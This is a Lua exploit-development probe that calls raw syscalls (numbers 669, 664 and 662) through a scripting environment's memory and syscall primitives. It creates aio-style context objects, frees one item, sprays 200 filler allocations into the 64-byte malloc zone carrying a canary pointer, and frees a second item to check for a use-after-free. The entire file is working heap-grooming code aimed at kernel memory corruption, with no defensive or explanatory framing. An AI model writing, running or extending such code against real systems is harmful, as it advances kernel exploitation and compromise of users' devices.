-- CRASH_CLASS: RISKY
-- PROBE 507a: saturate the 64-byte malloc zone with aio descriptor arrays carrying
-- a canary at +0x10, then let a second item of the shared-context object delete.
--
-- 504c had only three filler creates, which may have missed the freed context's
-- slot.  create(count=1) allocates D = malloc(1*0x28) first (64-byte zone), the
-- same zone as C (malloc(0x30)), so 200 fillers should cover every free slot.
-- If the second item's delete really re-reads the shared context, the canary
-- page is the pointer it releases.

print("=== PROBE 507a: fill the 64-byte zone ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local sc_c, sc_p, sc_d = make_syscall(669), make_syscall(664), make_syscall(662)
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fill(a, v, n) for o = 0, (n or 64) - 4, 4 do wr(a + o, v) end end
local function u64(a)
    local h, l = 0, to_num(a)
    if type(a) == "table" and a.h then h, l = to_num(a.h), to_num(a.l) end
    return uint64(string.format("0x%X%08X", h, l))
end

local DATA = memory.alloc(0x100)
local DESC = memory.alloc(0x200)
local OUT  = memory.alloc(0x80)
local IDS  = memory.alloc(0x200)
local RES  = memory.alloc(0x400)
local CAN  = memory.alloc(0x100)
fill(DATA, 0)
fill(DESC, 0x43434343, 0x100)
wr(CAN, 0x41414141); wr(CAN + 4, 0xDEADBEEF)
wq(DESC + 0x10, u64(CAN))
wq(DESC + 0x18, 0)
wq(DESC + 0x20, 0)
print(string.format("canary 0x%X = %08x", to_num(CAN), rd(CAN)))

local N = 2
local function one_id(base, i) return base + i * 0x10000 end
wr(OUT, 0)
local okc, retc = pcall(function() return sc_c(0x1001, DATA, N, 1, OUT) end)
local base = rd(OUT)
print(string.format("A create count=%d ret=%d base=%d", N, to_num(retc), base))
if base == 0 then print("=== DONE ===") return end
for i = 0, N - 1 do
    wr(IDS, one_id(base, i)); fill(RES, 0x77777777, 8)
    pcall(function() return sc_p(IDS, 1, RES) end)
end

wr(IDS, one_id(base, 0)); fill(RES, 0x77777777, 8)
local ok0, r0 = pcall(function() return sc_d(IDS, 1, RES) end)
print(string.format("B delete item0 ret=%d st=%08x", to_num(r0), rd(RES)))

local made = 0
for k = 1, 200 do
    wr(OUT, 0)
    local ok, r = pcall(function() return sc_c(1, DESC, 1, 1, OUT) end)
    if ok and to_num(r) == 0 and rd(OUT) ~= 0 then made = made + 1
    else print(string.format("  filler %d failed ret=%d id=%d", k, to_num(r), rd(OUT))); break end
end
print(string.format("C fillers made=%d  canary before=%08x %08x", made, rd(CAN), rd(CAN + 4)))

wr(IDS, one_id(base, 1)); fill(RES, 0x77777777, 8)
local ok1, r1 = pcall(function() return sc_d(IDS, 1, RES) end)
print(string.format("D delete item1 ret=%d st=%08x", to_num(r1), rd(RES)))
local after = rd(CAN)
print(string.format("  canary after=%08x %08x", after, rd(CAN + 4)))
if after ~= 0x41414141 then
    print("*** CANARY CHANGED: shared context was re-read from our bytes ***")
else
    print("canary untouched")
end
print("=== DONE ===")
